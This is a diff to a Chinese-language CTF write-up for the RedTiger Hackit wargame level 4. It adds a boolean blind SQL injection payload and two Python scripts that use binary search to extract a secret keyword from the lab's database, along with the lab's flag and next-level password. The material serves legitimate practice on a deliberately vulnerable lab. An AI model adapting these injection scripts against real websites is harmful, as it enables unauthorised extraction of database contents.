@@ -727,19 +727,102 @@ curl "https://redtiger.labs.overthewire.org/level4.php" -H "Cookie: level2login=
 正常页面显示`Query returned 1 rows. `。
 注入`'`，新页面显示`Query returned 0 rows. `。说明这是错误结果。
 
-利用布尔盲注，通过返回页面中`Query returned 1 rows. `的结果来筛选出目标结果。
-
-
+利用`布尔盲注`，通过返回页面中`Query returned 1 rows. `的结果来筛选出目标结果。
 
 ```
-ascii(substr(select keyword from level4_secret, {0}, 1))<{1}
+and (select ascii(substr(keyword,1,1)) from level4_secret limit 0,1)<{1}
 ```
 
+利用脚本来进行盲注很easy。但是需要提前把SQL语句测试准确，以免带来额外的调试。
+
+先获取值的长度，再逐个获取字符。这里采用折半搜索。
+
+```
+import requests
+import re
+url_length="http://redtiger.labs.overthewire.org/level4.php?id=1 and (select length(keyword) from level4_secret limit 0,1)<{0}"
+
+cookies={"level2login":"4_is_not_random",
+         "level3login":"feed_your_cat_before_your_cat_feeds_you",
+         "level4login":"there_is_no_bug"
+        }
+h=50
+l=1
+length=(l+h)/2
+while l <= h:
+    url = url_length.format(length)
+    resp=requests.get(url, cookies=cookies)
+    if resp.status_code != 200:
+        print "status code error "
+    text = resp.content
+    if text.find('Query returned 1 rows.') != -1: 
+        h = length-1
+    else:
+        l = length+1
+    length =(h+l)/2
+
+print 'length = ', length
+```
+
+再进行逐个字符测试。
+需要牢记的是ASCII字符集由95个可打印字符（**0x20-0x7E**）和33个控制字符（**0x00-0x19，0x7F**）组成。
+由于采取了折半搜索，需要根据返回结果来判断，得到的字符是否需要+1。
+
+```
+import requests
+import re
+url_format="http://redtiger.labs.overthewire.org/level4.php?id=1 and (select ascii(substr(keyword,{0},1)) from level4_secret limit 0,1)>{1}"
+
+cookies={"level2login":"4_is_not_random",
+         "level3login":"feed_your_cat_before_your_cat_feeds_you",
+         "level4login":"there_is_no_bug"
+        }
+result = ""
+for i in range(1, 21+1):
+    print "%d th round"%(i)
+    h= 0x7E
+    l= 0x20
+    flag=0
+    while l <= h:
+        c=(l+h)/2
+        #print 'h=', chr(h)
+        #print 'l=', chr(l)
+        #print 'c=%d'%c
+        url = url_format.format(i,c)
+        #print url
+        resp=requests.get(url, cookies=cookies)
+        if resp.status_code != 200:
+            print "status code error "
+        text = resp.content
+        #print text
+        if text.find('Query returned 1 rows.') == -1:
+            h = c-1
+            flag=0
+        else:
+            l = c+1
+            flag=1
+    print 'c=',c,' flag=', flag
+    if flag:
+        c+=1
+    print 'found c = ', chr(c)
+    result+=chr(c)
+
+print 'result = ', result
+```
+
+
+> You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa
+> The password for the next level is: there_is_a_truck
+
+```
+curl "http://redtiger.labs.overthewire.org/level5.php" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug"
+```
 
 ## 参考网站
 [1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
 [2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
 [3] [Redtiger Hackit Writeup](https://blog.spoock.com/2016/07/25/redtiger-writeup/)
+[4] [RedTiger libs writeup](http://ph0rse.me/2017/07/29/RedTiger-libs-writeup/)
 
 # sqli-labs
 
